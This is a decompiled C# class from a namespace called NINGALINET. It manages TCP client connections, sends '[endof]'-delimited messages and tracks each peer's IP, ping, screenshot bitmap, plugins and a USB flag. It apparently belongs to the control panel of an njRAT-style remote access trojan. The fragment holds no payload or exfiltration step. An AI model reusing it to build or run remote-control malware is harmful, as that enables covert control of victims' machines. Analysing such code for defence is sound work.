using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace NINGALINET
{
	// Token: 0x0200002A RID: 42
	public class Client
	{
		// Token: 0x060007D9 RID: 2009 RVA: 0x0003E748 File Offset: 0x0003C948
		public static int smethod_1(int int_0, int int_1)
		{
			int result;
			if (int_1 == 0)
			{
				result = 0;
			}
			else
			{
				result = checked((int)Math.Round(Math.Round(unchecked((double)int_0 / (double)int_1 * 100.0))));
			}
			return result;
		}

		// Token: 0x060007DA RID: 2010 RVA: 0x0003E77C File Offset: 0x0003C97C
		public int rp()
		{
			int result;
			if (this.Length == -1L)
			{
				result = 0;
			}
			else
			{
				int num;
				try
				{
					num = checked(NINGALINET.Client.smethod_1((int)this.M.Length, (int)this.Length));
				}
				catch (Exception expr_33)
				{
					ProjectData.SetProjectError(expr_33);
					num = 0;
					ProjectData.ClearProjectError();
				}
				result = num;
			}
			return result;
		}

		// Token: 0x060007DB RID: 2011 RVA: 0x0003E7E0 File Offset: 0x0003C9E0
		public Client(TcpClient c)
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			this.Buzy = false;
			this.CN = true;
			this.Isend = false;
			this.IsPNGED = false;
			this.IsUSB = false;
			this.lp = 0;
			this.M = new MemoryStream();
			this.oip = "";
			this.pc = null;
			this.Ping = 0;
			this.plg = new List<string>();
			this.snf = null;
			this.SPL = "[endof]";
			this.Client = c;
			ima.F.Invoke(new Client._INV(this.inv));
		}

		// Token: 0x060007DC RID: 2012 RVA: 0x0003E884 File Offset: 0x0003CA84
		private void inv()
		{
			this.T = new Timer
			{
				Interval = 1,
				Enabled = true
			};
		}

		// Token: 0x060007DD RID: 2013 RVA: 0x0003E8AC File Offset: 0x0003CAAC
		public string ip()
		{
			if (this.oip.Length <= 0)
			{
				try
				{
					this.oip = this.Client.Client.RemoteEndPoint.ToString();
				}
				catch (Exception expr_31)
				{
					ProjectData.SetProjectError(expr_31);
					Exception projectError = expr_31;
					ProjectData.SetProjectError(projectError);
					this.oip = this.GetHashCode().ToString();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			return this.oip;
		}

		// Token: 0x060007DE RID: 2014 RVA: 0x0003E930 File Offset: 0x0003CB30
		public bool Send(byte[] b)
		{
			checked
			{
				bool result;
				if (!this.CN)
				{
					result = false;
				}
				else
				{
					bool flag;
					try
					{
						Socket client = this.Client.Client;
						Socket obj = client;
						lock (obj)
						{
							MemoryStream memoryStream = new MemoryStream();
							memoryStream.Write(b, 0, b.Length);
							memoryStream.Write(Fungsi.SB(ref this.SPL), 0, this.SPL.Length);
							this.Client.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
							ima.SNT = (int)memoryStream.Length;
							ima.SNT2 += (int)memoryStream.Length;
							memoryStream.Dispose();
						}
						flag = true;
					}
					catch (Exception expr_A7)
					{
						ProjectData.SetProjectError(expr_A7);
						Exception projectError = expr_A7;
						ProjectData.SetProjectError(projectError);
						this.CN = false;
						flag = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					result = flag;
				}
				return result;
			}
		}

		// Token: 0x060007DF RID: 2015 RVA: 0x000047E4 File Offset: 0x000029E4
		public bool Send(string S)
		{
			return this.Send(Fungsi.SB(ref S));
		}

		// Token: 0x060007E0 RID: 2016 RVA: 0x000047F3 File Offset: 0x000029F3
		public void SendNoWait(byte[] b)
		{
			this.Send(b);
		}

		// Token: 0x060007E1 RID: 2017 RVA: 0x000047FD File Offset: 0x000029FD
		private void T_Tick(object sender, EventArgs e)
		{
			checked
			{
				this.Ping++;
			}
		}

		// Token: 0x170002DB RID: 731
		// (get) Token: 0x060007E2 RID: 2018 RVA: 0x0003EA2C File Offset: 0x0003CC2C
		// (set) Token: 0x060007E3 RID: 2019 RVA: 0x0003EA44 File Offset: 0x0003CC44
		public virtual Timer T
		{
			get
			{
				return this._T;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.T_Tick);
				if (this._T != null)
				{
					this._T.Tick -= value2;
				}
				this._T = value;
				if (this._T != null)
				{
					this._T.Tick += value2;
				}
			}
		}

		// Token: 0x040003A5 RID: 933
		private Timer _T;

		// Token: 0x040003A6 RID: 934
		public bool Buzy;

		// Token: 0x040003A7 RID: 935
		public TcpClient Client;

		// Token: 0x040003A8 RID: 936
		public bool CN;

		// Token: 0x040003A9 RID: 937
		public string Folder;

		// Token: 0x040003AA RID: 938
		public bool Isend;

		// Token: 0x040003AB RID: 939
		public bool IsPNGED;

		// Token: 0x040003AC RID: 940
		public bool IsUSB;

		// Token: 0x040003AD RID: 941
		public ListViewItem L;

		// Token: 0x040003AE RID: 942
		public int lp;

		// Token: 0x040003AF RID: 943
		public MemoryStream M;

		// Token: 0x040003B0 RID: 944
		private string oip;

		// Token: 0x040003B1 RID: 945
		public Bitmap pc;

		// Token: 0x040003B2 RID: 946
		public int Ping;

		// Token: 0x040003B3 RID: 947
		public List<string> plg;

		// Token: 0x040003B4 RID: 948
		public string[] snf;

		// Token: 0x040003B5 RID: 949
		public string SPL;

		// Token: 0x040003B6 RID: 950
		public long Length;

		// Token: 0x0200002B RID: 43
		// (Invoke) Token: 0x060007E7 RID: 2023
		private delegate void _INV();
	}
}
